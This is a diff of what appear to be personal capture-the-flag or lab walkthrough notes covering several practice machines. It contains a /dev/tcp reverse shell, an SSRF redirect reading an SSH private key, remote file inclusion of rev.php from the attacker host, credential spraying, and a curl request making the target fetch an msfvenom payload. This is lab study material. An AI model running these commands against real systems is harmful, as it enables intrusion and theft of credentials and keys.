@@ -28,6 +28,10 @@
 #### Roquefort => Gitea git hook 
 1. Create repo & run git hook manually = `0<&196;exec 196<>/dev/tcp/{{LHOST}}/2222; sh <&196 >&196 2>&196` 
 
+#### Snookums => LFI 
+1. Google suggests `http://{{RHOST}}/image.php?img=http://{{LHOST}}/rev.php` 
+2. Look around for db creds, get user creds from mysql 
+
 #### Symbolic => SSRF for PDF uploads  
 1. **Must** use apache2 & 'header' => `<?php header('Location: file:///Users/{{USERNAME}}/.ssh/id_rsa'); ?>` 
 2. Run `curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'` 
@@ -45,6 +49,13 @@
 2. Discover .db by looking in .bash_history 
 3. Whack `ls -al` and '--help' on weird executables! 
 
+#### Workaholic => Wordpress, ftp, gcc 
+1. Use WPScan or `gobuster dir -u {{RHOST}}/wp-content/plugins -w /usr/share/wordlists/metasploit/wp-plugins.txt --exclude-length 0` 
+2. Spray creds on ftp, pull wp-config.php and spray on ssh. 
+
+#### XposedAPI => X-forwarded-for 
+1. Run `curl http://{{RHOST}}/logs -H "X-Forwarded-For:localhost"` to find LFI (cos main page suggests localhost) 
+2. Use msfvenom then `curl -X POST http://{{RHOST}}/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://{{LHOST}}/exp.elf"}'` (cos main page suggests linux binary) 
 
 ---- 
 
@@ -65,3 +76,4 @@ If IP-restricted, try `X-Forwarded-For: 10.10.10.10` header.
 Use curl -v to check header & version. Wappalyzer? 
 Also check for /webdav , /zm , /login ; and gobuster to find upload folder. 
 Try uploading `.htaccess` then php using custom ext (eg .dork). 
+
